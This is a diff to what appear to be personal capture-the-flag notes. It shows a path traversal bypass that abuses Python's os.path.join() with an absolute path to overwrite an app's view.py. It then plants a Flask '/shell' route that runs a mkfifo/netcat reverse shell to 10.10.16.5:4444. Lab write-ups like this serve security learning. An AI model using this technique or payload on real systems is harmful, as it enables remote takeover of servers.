@@ -57,6 +57,24 @@ whatweb http://<ip>
 
 - looks like is replacement the string `../` in order to avoid path traversal
 >[!example]- Result
->![[Pasted image 20250226154333.png]]
+>![[Pasted image 20250226160227.png]]
 
-- 
+- so we can exploit the function `os.path.join()` (because if we use `/` the left path of the command will be removed) 
+>[!info]- Like this:
+>`/route/to/path/public/uploads/MyFileName` 
+>to
+>`/MyfileName`
+
+- We can change the file `view.py` to a custom file with a custom function like this, in order to get a [revershell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) (we know that the path is `/app/app/` because source code and a information leakage when we upload a wrong)
+>[!info]- Information leakage
+>![[Pasted image 20250226161724.png]]
+
+```python
+@app.route('/shell')
+def cmd():
+    return os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.5 4444 >/tmp/f")
+```
+>[!example]- Result
+>![[Pasted image 20250226161255.png]]
+
+
